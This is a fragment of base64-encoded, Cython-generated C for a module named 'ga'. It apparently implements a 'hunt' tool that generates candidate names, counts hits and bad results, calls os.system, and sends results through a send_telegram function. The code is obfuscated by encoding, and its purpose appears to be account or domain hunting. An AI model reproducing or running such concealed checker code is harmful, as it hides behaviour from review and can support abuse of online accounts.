QVhfQ0hBUl9WQUxVRShfX3B5eF90XzgpKTsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgIF9fcHl4X3RfNiA9IDE7CiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X3RfN307CiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQxLCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICB9CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgICAKICAgIGdvdG8gX19weXhfTDI7CiAgfQoKICAKICAgewogICAgX19QeXhf""R2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9CKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5TGlzdF9QYWNrKDIsIF9fcHl4X3RfMywgX19weXhfdF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZGhkb21haW4sIF9fcHl4X3RfNykgPCAwKSBfX1BZWF9FUlIoMCwgNDMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogICAgCiAgICBfX3B5eF90XzUgPSBOVUxMOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogICAgX19weXhfdF8zID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0NCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9IKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2Rl""KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fcHl4X3RfMTFbMF0gPSBfX3B5eF90Xzg7CiAgICBfX3B5eF90XzExWzFdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9TZWxlY3RlZF9Cb3RoX2RvbWFpbnM7CiAgICBfX3B5eF90XzExWzJdID0gX19weXhfdF80OwogICAgX19weXhfdF8yID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xMSwgMywgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF84KSArIDIyICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF80KSwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfOCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF80KSk7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX3B5eF90XzYgPSAxOwogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90XzJ9OwogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0NCwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgfQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgfQogIF9fcHl4X0wyOjsKCiAgCiAgX19weXhfdF8zID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zbGVlcCk7IGlmICh1bmxp""a2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQ1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xfTsKICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAKICBfX3B5eF90XzUgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0NiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9BKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfdF8zfTsKICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9f""cHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0NiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGl0X2NvdW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCkgPCAwKSBfX1BZWF9FUlIoMCwgNDcsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9jb3VudCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgMCkgX19QWVhfRVJSKDAsIDQ4LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgX19weXhfdF8yID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQ5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0xvY2spOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0OSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTsKICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgfQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbG9jaywgX19weXhfdF83KSA8IDApIF9fUFlYX0VSUigwLCA0OSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogIAogIF9fUHl4X0dldE1vZHVs""ZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RyaW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXNjaWlfbG93ZXJjYXNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RyaW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGlnaXRzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIF9fcHl4X3RfNyA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzUsIF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDUwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0YsIF9fcHl4X3RfNykgPCAwKSBfX1BZWF9FUlIoMCwgNTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAKICBfX3B5eF90XzcgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8yZ2FfMXNlbmRfdGVsZWdyYW0sIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZW5kX3RlbGVncmFtLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2EsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxXSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA1MywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgaWYgKFB5""RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZW5kX3RlbGVncmFtLCBfX3B5eF90XzcpIDwgMCkgX19QWVhfRVJSKDAsIDUzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKCiAgCiAgX19weXhfdF83ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMmdhXzNoaTJfZmIsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oaTJfZmIsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nYSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzJdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDYyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpMl9mYiwgX19weXhfdF83KSA8IDApIF9fUFlYX0VSUigwLCA2MiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogIAogIF9fcHl4X3RfNyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJnYV81c3RhcnRfaHVudCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0YXJ0X2h1bnQsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nYSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzNdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDk5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0YXJ0X2h1bnQsIF9fcHl4X3RfNykgPCAwKSBfX1BZWF9FUlIoMCwgOTksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25hbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMTEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fcHl4X3RfMTAgPSAoX19QeXhfUHlVbmljb2RlX0VxdWFscyhfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tYWluLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTAgPCAwKSkpIF9fUFlYX0VS""UigwLCAxMTEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIGlmIChfX3B5eF90XzEwKSB7CgogICAgCiAgICBfX3B5eF90XzIgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGFydF9odW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTEyLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgX19weXhfdF82ID0gMTsKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgTlVMTH07CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTEyLCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICB9CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKCiAgICAKICB9CgogIAogIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXN0LCBfX3B5eF90XzcpIDwgMCkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAKCiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOwogIGlmIChfX3B5eF9tKSB7CiAgICBpZiAoX19weXhfbXN0YXRlLT5fX3B5eF9kICYmIHN0cmluZ3RhYl9pbml0aWFsaXplZCkgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImluaXQgZ2EiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgIH0KICAgICNpZiAhQ1lUSE9OX1VTRV9NT0RV""TEVfU1RBVEUKICAgIFB5X0NMRUFSKF9fcHl4X20pOwogICAgI2Vsc2UKICAgIFB5X0RFQ1JFRihfX3B5eF9tKTsKICAgIGlmIChweXN0YXRlX2FkZG1vZHVsZV9ydW4pIHsKICAgICAgUHlPYmplY3QgKnRwLCAqdmFsdWUsICp0YjsKICAgICAgUHlFcnJfRmV0Y2goJnRwLCAmdmFsdWUsICZ0Yik7CiAgICAgIFB5U3RhdGVfUmVtb3ZlTW9kdWxlKCZfX3B5eF9tb2R1bGVkZWYpOwogICAgICBQeUVycl9SZXN0b3JlKHRwLCB2YWx1ZSwgdGIpOwogICAgfQogICAgI2VuZGlmCiAgfSBlbHNlIGlmICghUHlFcnJfT2NjdXJyZWQoKSkgewogICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0ltcG9ydEVycm9yLCAiaW5pdCBnYSIpOwogIH0KICBfX3B5eF9MMDo7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVAogIHJldHVybiAoX19weXhfbSAhPSBOVUxMKSA/IDAgOiAtMTsKICAjZWxzZQogIHJldHVybiBfX3B5eF9tOwogICNlbmRpZgp9CgoKdHlwZWRlZiBzdHJ1Y3QgewogICAgY29uc3QgY2hhciAqczsKI2lmIDI5MzkgPD0gNjU1MzUKICAgIGNvbnN0IHVuc2lnbmVkIHNob3J0IG47CiNlbGlmIDI5MzkgLyAyIDwgSU5UX01BWAogICAgY29uc3QgdW5zaWduZWQgaW50IG47CiNlbGlmIDI5MzkgLyAyIDwgTE9OR19NQVgKICAgIGNvbnN0IHVuc2lnbmVkIGxvbmcgbjsKI2Vsc2UKICAgIGNvbnN0IFB5X3NzaXplX3QgbjsKI2VuZGlmCiNpZiAxIDw